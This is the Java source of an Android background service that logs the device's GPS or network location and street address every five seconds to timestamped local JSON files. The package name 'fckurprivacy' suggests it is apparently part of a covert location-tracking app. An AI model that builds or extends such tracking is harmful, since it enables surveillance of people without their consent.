package com.vergermiya.harevost.fckurprivacy.locationChecker;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.vergermiya.harevost.fckurprivacy.Util.FileSaver;
import com.vergermiya.harevost.fckurprivacy.Util.JsonBuilder;

import org.json.JSONStringer;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class LocationService extends Service {

    private LocationClient mLocationClient;

    public LocationService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        mLocationClient = new LocationClient(getApplicationContext());
        mLocationClient.registerLocationListener(new LocationListener());
        requestLocation();
        Log.d("Location", "requestOK");
        return START_REDELIVER_INTENT;
    }

    private void requestLocation() {
        initLocation();
        mLocationClient.start();
    }

    private void initLocation(){
        LocationClientOption option = new LocationClientOption();
        option.setScanSpan(5000);
        option.setIsNeedAddress(true);
        mLocationClient.setLocOption(option);
    }

    class LocationListener implements BDLocationListener{
        @Override
        public void onReceiveLocation(BDLocation location){

            Date date = new Date(System.currentTimeMillis());
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.CHINA);

            LocationJson locationJson = new LocationJson("", "", "", "", "");

            locationJson.setDate(dateFormat.format(date));
            locationJson.setLatitude(String.valueOf(location.getLatitude()));
            locationJson.setLongitude(String.valueOf(location.getLongitude()));

            StringBuilder currentPosition = new StringBuilder();
            currentPosition.append(location.getCountry());
            currentPosition.append(location.getProvince());
            currentPosition.append(location.getCity());
            currentPosition.append(location.getDistrict());
            currentPosition.append(location.getStreet()).append("|");
            currentPosition.append(location.getLocationDescribe());
            locationJson.setRealLoc(currentPosition.toString());

            if(location.getLocType() == BDLocation.TypeGpsLocation) {
                locationJson.setType("GPS");
            }
            else if (location.getLocType() == BDLocation.TypeNetWorkLocation) {
                locationJson.setType("NET");
            }

            if (!locationJson.getLatitude().equals(String.valueOf(4.9E-324))) {
                FileSaver fileSaver = new FileSaver();
                JSONStringer jsonStringer = JsonBuilder.buildLocJson(locationJson);
                Log.d("Location", jsonStringer.toString());
                fileSaver.saveFile(dateFormat.format(date) + "_LocLog", ".json", jsonStringer.toString());
            }
        }
    }
}
